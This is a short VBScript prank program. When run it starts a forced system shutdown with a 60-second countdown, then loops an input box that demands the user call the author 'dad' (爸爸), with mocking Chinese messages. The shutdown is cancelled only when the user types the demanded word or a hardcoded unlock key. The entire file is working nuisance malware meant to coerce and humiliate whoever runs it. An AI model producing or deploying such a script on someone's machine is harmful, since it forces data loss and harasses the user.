set ws=createobject("wscript.shell")
ws.run"cmd.exe /c shutdown -s -f -t 60"
text()
function text
dim a
a=inputbox("我是於海洋，你有一分钟时间，叫爸爸！")
if a="爸爸" or a="father" or a="爸爸！" or a="爸爸!" then
msgbox"儿子真乖，从此，你就是於海洋的儿子了！已解除关机",0,"恭喜"
ElseIf a="20120228201202283838" then
msgbox"输入解除密钥，成功关闭并解除关机",0,"恭喜"
ElseIf a="我是你爹" or a="54188" or a="我是你爸爸" or a="我是你爸" then
msgbox"敢说你是我爹？没门！",0,"来自你爸爸的气愤"
text
ElseIf a="就不叫" or a="不叫！" or a="不叫" then
msgbox"不叫是吧？没门！",0,"来自你爸爸的气愤"
text
else
msgbox"臭小子，不叫爸爸还想跑？",0,"再来一次"
text
end if
ws.run"cmd.exe /c shutdown -a"
end function